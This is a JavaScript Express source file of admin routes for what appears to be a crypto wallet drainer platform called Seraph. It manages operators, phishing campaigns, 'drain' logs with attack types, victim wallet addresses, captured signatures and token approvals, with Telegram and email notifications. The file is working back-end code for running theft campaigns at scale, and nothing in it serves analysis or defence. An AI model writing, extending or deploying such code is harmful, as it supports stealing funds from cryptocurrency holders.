/**
 * ============================================================================
 * SERAPH SERVER - Admin Routes (With Notification Integration)
 * ============================================================================
 * 
 * UPDATED:
 * - Added notification service cache clearing on settings update
 * - Added email test endpoint
 * - Integrated with notification.service.js
 * 
 * ============================================================================
 */

import { Router } from 'express'
import { requireAdmin, requireSuperAdmin } from '../middleware/auth.js'
import operatorService from '../services/operator.service.js'
import campaignService from '../services/campaign.service.js'
import walletService from '../services/wallet.service.js'
import drainService from '../services/drain.service.js'
import signatureService from '../services/signature.service.js'
import notificationService from '../services/notification.service.js'
import supabase from '../config/supabase.js'
import { generateToken } from '../utils/jwt.js'
import { success, created, badRequest, notFound, paginated } from '../utils/response.js'
import { safeEncrypt, safeDecrypt } from '../utils/encryption.js'

const router = Router()

// All routes require admin auth
router.use(requireAdmin)

/**
 * GET /admin/dashboard
 * Get dashboard statistics
 */
router.get('/dashboard', async (req, res) => {
  try {
    const stats = await drainService.getDashboardStats()
    return success(res, stats)
  } catch (err) {
    return badRequest(res, err.message)
  }
})

/**
 * GET /admin/operators
 * List all operators
 */
router.get('/operators', async (req, res) => {
  try {
    const {
      page = 1,
      limit = 20,
      status,
      search,
      sortBy,
      sortOrder
    } = req.query
    
    const result = await operatorService.getAllOperators({
      page: parseInt(page),
      limit: parseInt(limit),
      status,
      search,
      sortBy,
      sortOrder
    })
    
    return paginated(res, result.operators, {
      page: result.page,
      limit: result.limit,
      total: result.total
    })
  } catch (err) {
    return badRequest(res, err.message)
  }
})

/**
 * GET /admin/operators/:id
 * Get operator details
 */
router.get('/operators/:id', async (req, res) => {
  try {
    const operator = await operatorService.getOperatorById(req.params.id)
    return success(res, operator)
  } catch (err) {
    return notFound(res, err.message)
  }
})

/**
 * POST /admin/operators
 * Create a new operator (admin only)
 */
router.post('/operators', async (req, res) => {
  try {
    const { email, username, password } = req.body
    
    if (!email || !username || !password) {
      return badRequest(res, 'Email, username, and password are required')
    }
    
    if (password.length < 8) {
      return badRequest(res, 'Password must be at least 8 characters')
    }
    
    if (username.length < 3 || username.length > 50) {
      return badRequest(res, 'Username must be 3-50 characters')
    }
    
    // Import auth service for registration
    const authService = (await import('../services/auth.service.js')).default
    
    const result = await authService.registerOperator({ email, username, password })
    
    // Log activity
    await supabase
      .from('activity_logs')
      .insert({
        user_id: req.user.id,
        user_type: 'admin',
        action: 'operator.created',
        entity_type: 'operator',
        entity_id: result.operator.id,
        details: { email, username, createdBy: req.user.username }
      })
    
    return created(res, result.operator, 'Operator created successfully')
  } catch (err) {
    return badRequest(res, err.message)
  }
})

/**
 * PUT /admin/operators/:id
 * Update operator settings (destination wallet, notifications)
 */
router.put('/operators/:id', async (req, res) => {
  try {
    const operator = await operatorService.updateOperator(
      req.params.id,
      req.body,
      req.user.id
    )
    
    return success(res, operator, 'Operator updated')
  } catch (err) {
    return badRequest(res, err.message)
  }
})

/**
 * PUT /admin/operators/:id/status
 * Update operator status (suspend/activate/ban)
 */
router.put('/operators/:id/status', async (req, res) => {
  try {
    const { status } = req.body
    
    if (!status) {
      return badRequest(res, 'Status is required')
    }
    
    const operator = await operatorService.updateOperatorStatus(
      req.params.id,
      status,
      req.user.id
    )
    
    return success(res, operator, `Operator ${status}`)
  } catch (err) {
    return badRequest(res, err.message)
  }
})

/**
 * DELETE /admin/operators/:id
 * Delete operator
 */
router.delete('/operators/:id', async (req, res) => {
  try {
    await operatorService.deleteOperator(req.params.id, req.user.id)
    return success(res, null, 'Operator deleted')
  } catch (err) {
    return badRequest(res, err.message)
  }
})

/**
 * POST /admin/operators/:id/impersonate
 * Get a token to impersonate operator (super admin only)
 */
router.post('/operators/:id/impersonate', requireSuperAdmin, async (req, res) => {
  try {
    const operator = await operatorService.getOperatorById(req.params.id)
    
    // Generate token for operator
    const token = generateToken({
      id: operator.id,
      email: operator.email,
      username: operator.username,
      type: 'operator',
      impersonatedBy: req.user.id
    })
    
    return success(res, {
      token,
      operator: {
        id: operator.id,
        email: operator.email,
        username: operator.username
      }
    }, 'Impersonation token generated')
  } catch (err) {
    return badRequest(res, err.message)
  }
})

/**
 * GET /admin/campaigns
 * List all campaigns
 */
router.get('/campaigns', async (req, res) => {
  try {
    const {
      page = 1,
      limit = 20,
      status,
      operatorId,
      search
    } = req.query
    
    const result = await campaignService.getAllCampaigns({
      page: parseInt(page),
      limit: parseInt(limit),
      status,
      operatorId,
      search
    })
    
    return paginated(res, result.campaigns, {
      page: result.page,
      limit: result.limit,
      total: result.total
    })
  } catch (err) {
    return badRequest(res, err.message)
  }
})

/**
 * GET /admin/campaigns/:id
 * Get campaign details
 */
router.get('/campaigns/:id', async (req, res) => {
  try {
    const campaign = await campaignService.getCampaignById(req.params.id)
    return success(res, campaign)
  } catch (err) {
    return notFound(res, err.message)
  }
})

/**
 * PUT /admin/campaigns/:id
 * Update campaign
 */
router.put('/campaigns/:id', async (req, res) => {
  try {
    const campaign = await campaignService.updateCampaign(req.params.id, null, req.body)
    return success(res, campaign, 'Campaign updated')
  } catch (err) {
    return badRequest(res, err.message)
  }
})

/**
 * DELETE /admin/campaigns/:id
 * Delete campaign
 */
router.delete('/campaigns/:id', async (req, res) => {
  try {
    await campaignService.deleteCampaign(req.params.id)
    return success(res, null, 'Campaign deleted')
  } catch (err) {
    return badRequest(res, err.message)
  }
})

/**
 * GET /admin/wallets
 * List all wallets
 */
router.get('/wallets', async (req, res) => {
  try {
    const { page = 1, limit = 20, operatorId, chainId } = req.query
    
    const result = await walletService.getAllWallets({
      page: parseInt(page),
      limit: parseInt(limit),
      operatorId,
      chainId: chainId ? parseInt(chainId) : undefined
    })
    
    return paginated(res, result.wallets, {
      page: result.page,
      limit: result.limit,
      total: result.total
    })
  } catch (err) {
    return badRequest(res, err.message)
  }
})

/**
 * GET /admin/drains
 * List all drain logs
 */
router.get('/drains', async (req, res) => {
  try {
    const {
      page = 1,
      limit = 20,
      status,
      attackType,
      operatorId,
      campaignId,
      startDate,
      endDate,
      blockedOnly
    } = req.query
    
    const result = await drainService.getAllDrainLogs({
      page: parseInt(page),
      limit: parseInt(limit),
      status,
      attackType,
      operatorId,
      campaignId,
      startDate,
      endDate,
      blockedOnly: blockedOnly === 'true'
    })
    
    return paginated(res, result.drains, {
      page: result.page,
      limit: result.limit,
      total: result.total
    })
  } catch (err) {
    return badRequest(res, err.message)
  }
})

/**
 * GET /admin/drains/:id
 * Get drain details
 */
router.get('/drains/:id', async (req, res) => {
  try {
    const drain = await drainService.getDrainById(req.params.id)
    return success(res, drain)
  } catch (err) {
    return notFound(res, err.message)
  }
})

/**
 * GET /admin/recent
 * Get recent drains across all operators
 */
router.get('/recent', async (req, res) => {
  try {
    const { limit = 10 } = req.query
    const drains = await drainService.getRecentDrains(null, parseInt(limit))
    return success(res, drains)
  } catch (err) {
    return badRequest(res, err.message)
  }
})

/**
 * GET /admin/signatures
 * List all signatures
 */
router.get('/signatures', async (req, res) => {
  try {
    const {
      page = 1,
      limit = 20,
      status,
      signatureType,
      operatorId,
      campaignId,
      victimAddress
    } = req.query
    
    const result = await signatureService.getAllSignatures({
      page: parseInt(page),
      limit: parseInt(limit),
      status,
      signatureType,
      operatorId,
      campaignId,
      victimAddress
    })
    
    return paginated(res, result.signatures, {
      page: result.page,
      limit: result.limit,
      total: result.total
    })
  } catch (err) {
    return badRequest(res, err.message)
  }
})

/**
 * GET /admin/signatures/:id
 * Get signature details
 */
router.get('/signatures/:id', async (req, res) => {
  try {
    const sig = await signatureService.getSignatureById(req.params.id)
    return success(res, sig)
  } catch (err) {
    return notFound(res, err.message)
  }
})

/**
 * DELETE /admin/signatures/:id
 * Delete a signature
 */
router.delete('/signatures/:id', async (req, res) => {
  try {
    await signatureService.deleteSignature(req.params.id)
    return success(res, null, 'Signature deleted')
  } catch (err) {
    return badRequest(res, err.message)
  }
})

// ============================================================================
// APPROVALS (View all approvals across operators)
// ============================================================================

/**
 * GET /admin/approvals
 * List all approvals
 */
router.get('/approvals', async (req, res) => {
  try {
    const {
      page = 1,
      limit = 50,
      status,
      operatorId,
      campaignId
    } = req.query
    
    let query = supabase
      .from('approvals')
      .select(`
        *,
        campaign:campaigns(id, name),
        operator:operators(id, username)
      `, { count: 'exact' })
    
    if (status) {
      query = query.eq('status', status)
    }
    
    if (operatorId) {
      query = query.eq('operator_id', operatorId)
    }
    
    if (campaignId) {
      query = query.eq('campaign_id', campaignId)
    }
    
    query = query
      .order('created_at', { ascending: false })
      .range((page - 1) * limit, page * limit - 1)
    
    const { data, error, count } = await query
    
    if (error) throw new Error(error.message)
    
    return paginated(res, data, {
      page: parseInt(page),
      limit: parseInt(limit),
      total: count || 0
    })
  } catch (err) {
    return badRequest(res, err.message)
  }
})

/**
 * GET /admin/approvals/:id
 * Get approval details
 */
router.get('/approvals/:id', async (req, res) => {
  try {
    const { data, error } = await supabase
      .from('approvals')
      .select(`
        *,
        campaign:campaigns(id, name, destination_wallet),
        operator:operators(id, username, email)
      `)
      .eq('id', req.params.id)
      .single()
    
    if (error) throw new Error('Approval not found')
    
    return success(res, data)
  } catch (err) {
    return notFound(res, err.message)
  }
})

/**
 * DELETE /admin/approvals/:id
 * Delete approval record
 */
router.delete('/approvals/:id', async (req, res) => {
  try {
    const { error } = await supabase
      .from('approvals')
      .delete()
      .eq('id', req.params.id)
    
    if (error) throw new Error(error.message)
    
    return success(res, null, 'Approval deleted')
  } catch (err) {
    return badRequest(res, err.message)
  }
})

// ============================================================================
// PLATFORM SETTINGS (SuperAdmin Only)
// ============================================================================

/**
 * GET /admin/platform-settings
 * Get all platform settings
 */
router.get('/platform-settings', requireSuperAdmin, async (req, res) => {
  try {
    const { data: settings, error } = await supabase
      .from('platform_settings')
      .select('key, value, is_encrypted')
    
    if (error) throw error
    
    // Build response object, mask sensitive values
    const result = {}
    for (const setting of settings) {
      if (setting.is_encrypted && setting.value) {
        // Return masked value for display, actual value only when needed
        result[setting.key] = '••••••••'
      } else {
        result[setting.key] = setting.value
      }
    }
    
    return success(res, result)
  } catch (err) {
    return badRequest(res, err.message)
  }
})

/**
 * PUT /admin/platform-settings
 * Update platform settings
 * 
 * UPDATED: Now clears notification service cache after update
 */
router.put('/platform-settings', requireSuperAdmin, async (req, res) => {
  try {
    const updates = req.body
    
    if (!updates || typeof updates !== 'object') {
      return badRequest(res, 'Invalid settings data')
    }
    
    // Fields that should be encrypted
    const encryptedFields = ['telegram_bot_token', 'resend_api_key']
    
    // Update each setting
    for (const [key, value] of Object.entries(updates)) {
      // Skip if value is masked placeholder
      if (value === '••••••••') continue
      
      // Encrypt sensitive fields
      let finalValue = value
      let isEncrypted = false
      
      if (encryptedFields.includes(key) && value) {
        finalValue = safeEncrypt(value)
        isEncrypted = true
      }
      
      const { error } = await supabase
        .from('platform_settings')
        .update({ 
          value: finalValue || null,
          is_encrypted: isEncrypted,
          updated_at: new Date().toISOString()
        })
        .eq('key', key)
      
      if (error) throw error
    }
    
    // =========================================================================
    // IMPORTANT: Clear notification service cache after settings update
    // =========================================================================
    notificationService.clearSettingsCache()
    console.log('[Admin] Notification settings cache cleared')
    // =========================================================================
    
    // Log activity
    await supabase
      .from('activity_logs')
      .insert({
        user_id: req.user.id,
        user_type: 'admin',
        action: 'platform_settings.updated',
        entity_type: 'platform_settings',
        details: { 
          keys: Object.keys(updates).filter(k => updates[k] !== '••••••••'),
          updatedBy: req.user.username 
        }
      })
    
    return success(res, null, 'Platform settings updated')
  } catch (err) {
    return badRequest(res, err.message)
  }
})

/**
 * POST /admin/platform-settings/test-telegram
 * Send a test Telegram message
 */
router.post('/platform-settings/test-telegram', requireSuperAdmin, async (req, res) => {
  try {
    // Get Telegram settings
    const { data: settings, error } = await supabase
      .from('platform_settings')
      .select('key, value, is_encrypted')
      .in('key', ['telegram_bot_token', 'telegram_chat_id'])
    
    if (error) throw error
    
    const settingsMap = {}
    for (const s of settings) {
      if (s.is_encrypted && s.value) {
        settingsMap[s.key] = safeDecrypt(s.value)
      } else {
        settingsMap[s.key] = s.value
      }
    }
    
    const botToken = settingsMap.telegram_bot_token
    const chatId = settingsMap.telegram_chat_id
    
    if (!botToken || !chatId) {
      return badRequest(res, 'Telegram bot token and chat ID are required')
    }
    
    // Send test message via notification service
    const result = await notificationService.sendTestNotification('telegram', chatId)
    
    return success(res, result, 'Test message sent successfully')
  } catch (err) {
    return badRequest(res, err.message)
  }
})

/**
 * POST /admin/platform-settings/test-email
 * Send a test email
 * 
 * NEW: Email test endpoint
 */
router.post('/platform-settings/test-email', requireSuperAdmin, async (req, res) => {
  try {
    const { email } = req.body
    
    if (!email) {
      return badRequest(res, 'Email address is required')
    }
    
    // Validate email format
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
    if (!emailRegex.test(email)) {
      return badRequest(res, 'Invalid email format')
    }
    
    // Send test email via notification service
    const result = await notificationService.sendTestNotification('email', email)
    
    return success(res, result, 'Test email sent successfully')
  } catch (err) {
    return badRequest(res, err.message)
  }
})

/**
 * POST /admin/notifications/test
 * Generic notification test endpoint
 * 
 * Body: { type: 'telegram' | 'email', target: string }
 */
router.post('/notifications/test', requireSuperAdmin, async (req, res) => {
  try {
    const { type, target } = req.body
    
    if (!type || !target) {
      return badRequest(res, 'Type and target are required')
    }
    
    if (!['telegram', 'email'].includes(type)) {
      return badRequest(res, 'Type must be "telegram" or "email"')
    }
    
    const result = await notificationService.sendTestNotification(type, target)
    
    return success(res, result, `Test ${type} notification sent`)
  } catch (err) {
    return badRequest(res, err.message)
  }
})

/**
 * POST /admin/notifications/broadcast
 * Send a custom notification to SuperAdmin
 * 
 * Body: { message: string }
 */
router.post('/notifications/broadcast', requireSuperAdmin, async (req, res) => {
  try {
    const { message } = req.body
    
    if (!message) {
      return badRequest(res, 'Message is required')
    }
    
    await notificationService.sendToSuperAdmin(`📢 *Admin Broadcast*\n\n${message}`)
    
    return success(res, null, 'Broadcast sent')
  } catch (err) {
    return badRequest(res, err.message)
  }
})

export default router